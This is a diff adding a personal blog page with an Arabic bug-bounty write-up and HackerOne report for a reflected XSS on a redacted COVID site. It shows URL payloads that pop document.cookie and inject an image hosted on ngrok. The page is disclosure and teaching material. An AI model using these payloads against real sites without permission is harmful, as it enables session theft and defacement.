@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+        <link rel="stylesheet" href="../../assets/css/styles.css">
+        <link rel="shortcut icon" type="image/png" href="../../assets/img/hacker.png">
+        <title>Reflected XSS</title>
+    </head>
+    <body>
+
+        <a href="#" class="scrolltop" id="scroll-top">
+            <i class='bx bx-chevron-up scrolltop__icon'></i>
+        </a>
+        
+        <header class="l-header" id="header">
+            <nav class="nav bd-container">
+                <a href="../../index.html" class="nav__logo">Ahmed Hamza</a>
+                <div class="nav__menu" id="nav-menu">
+                    <ul class="nav__list">
+                        <li class="nav__item"><a href="../../index.html" class="nav__link">Home</a></li>
+                        <li class="nav__item"><a href="../writeups.html" class="nav__link active-link">Writeups</a></li>
+                        <li class="nav__item"><a href="../../tutorials/tutorials.html" class="nav__link">Tutorials</a></li>
+                        <li class="nav__item"><a href="../../it-project/it-project.html" class="nav__link">IT-Project</a></li>
+                        <li class="nav__item"><a href="" class="nav__link">CV</a></li>
+                        <li><i class='bx bx-moon change-theme' id="theme-button"></i></li>
+                    </ul>
+                </div>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class='bx bx-menu'></i>
+                </div>
+            </nav>
+        </header>
+
+        <main class="l-main">
+        <section class="menu section bd-container">
+            <h2 class="section-title">Reflected XSS</h2>
+            <div>
+
+<pre class="code">
+ Target       : target.com
+ Weakness     : Reflected-XSS
+ Date Of Scan : 2021-5-15
+</pre>
+<br>
+<p dir="rtl">
+السلام عليكم , 
+<br>
+شرح طريقة اكتشاف ثغرة Reflected XSS
+<br>
+<br>
+ماهي ثغرة Reflected XSS ؟ <br>
+تحدث ثغرة XSS عندما يسمح موقع الويب بتنفيذ اكواد جافاسكربت في متصفح المستخدم الذي يزور الموقع , لذالك يقوم المهاجم باستغلال 
+هذا الخطأ لتنفيذ اكواد خبيثة في متصفح الضحية وسرقة ملفات Cookies وغيرها من البيانات ... <br> 
+
+<br>
+خطوات اكتشاف ثغرة Reflected XSS 
+<br>
+<br>
+
+1.   نقوم بفتح الرابط التالي :
+</p>
+<pre class="code"> https://covid.target.com/covid19?p=  </pre>
+<br>
+<p dir="rtl">
+2. نقوم بحقن السكربت في الباراميتر p :  
+<br>
+</p>
+
+<pre class="code"> &lt;script&gt;alert(document.cookie)&lt;/script&gt;  </pre>
+<br>
+<p dir="rtl">
+3. سيتم تنفيذ السكربت وعرض ملف cookies 
+<br>
+</p>
+<br>
+<b>POC1:</b>
+
+<pre class="code"> https://covid.target.com/covid19?p=&lt;script&gt;alert(document.cookie)&lt;/script&gt;  </pre>
+<br>
+<b>Source Code:</b>
+<pre class="code"> Line 465: &lt;div id="freemarker_location" hidden&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/div&gt;  </pre>
+<br>
+<img src="images/xss1/1.png" width="100%" height="350px">
+<br><br>
+<img src="images/xss1/2.png" width="100%" height="350px">
+<br>
+<br>
+<b>POC2:</b>
+
+<p dir="rtl">
+حقن صورة في الموقع :
+</p>
+<br>
+<pre class="code"> https://covid.target.com/covid19?p=&lt;/div&gt;&lt;img src="https://111697rt098e.ngrok.io/Hacked2.jpg" width="" height=""&gt;  </pre>
+
+<br>
+<img src="images/xss1/3.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+
+<p dir="rtl"> 
+خطر الثغرة :
+<br>
+يستطيع المهاجم استغلال الثغرة وسرقة ملفات cookies من الضحية والاستيلاء على الحساب , وتنفيذ اكواد جافاسكربت للتجسس على الضحية مثل keylogger, وتغيير شكل الصفحة والتعديل عليها واضافة صور وفيديو ويمكن تحويل الضحية الى مواقع اخرى ...
+
+<br>
+<br>
+
+كيف يتم اصلاح الثغرة : 
+<br>
+نقوم باستخدام Content Security Policy (CSP) لمنع تنفيذ اي سكربت ضار 
+<br><br>
+
+المراجع : 
+<br>
+</p>
+
+<pre class="code"> <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">https://portswigger.net/web-security/cross-site-scripting  </a></pre>
+<br>
+
+<h2 class="section-title">HackerOne Report</h2>
+<pre class="code">
+ <b>Title:</b> 
+ Reflected XSS
+ 
+ <b>Description:</b>
+ Hello Team,
+ I have found Reflected XSS vulnerabilities on:
+ 
+ https://covid.target.com/covid19?p= 
+ AND
+ https://covid.target.com/vaccineCentres?p=  
+ 
+ 
+ <b>Steps To Reproduce:</b>
+ 1. visit below page: https://covid.target.com/covid19?p= 
+ 2. in the p parameter inject below payload: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+ 3. Notic the pop-up with your cookies
+
+
+ <b>POC1:</b> 
+ https://covid.target.com/covid19?p=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+ <b>Source Code:</b>
+ Line 465: &lt;div id="freemarker_location" hidden&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/div&gt;
+
+
+ <b>POC2:</b>
+ You can also inject image :
+ https://covid.target.com/covid19?p=&lt;/div&gt;&lt;img src="https://111697rt098e.ngrok.io/Hacked2.jpg" width="" height=""&gt;  
+</pre>
+
+</div>
+</section>
+</main>
+
+<footer class="footer section bd-container">
+
+</footer>
+
+<script src="https://unpkg.com/scrollreveal"></script>
+<script src="../../assets/js/main.js"></script>
+
+</body>
+</html>
